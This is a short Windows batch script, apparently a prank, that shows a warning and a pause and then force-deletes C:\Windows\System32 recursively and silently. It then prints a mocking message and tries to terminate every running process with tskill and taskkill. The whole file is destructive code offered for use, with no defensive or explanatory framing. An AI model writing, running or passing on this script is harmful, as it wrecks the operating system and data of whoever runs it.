@echo off
cls
color 03
echo WARNING!!! THIS SCRIPT WILL DESTROY YOUR COMPUTER!
echo Do you want to delete System32?
pause
del C:\Windows\System32 /s /f /q
cls
echo Your computer has been destroyed
echo and you will reinstall the operating system,
echo so thanks for destroying it!
pause
tskill *
taskkill *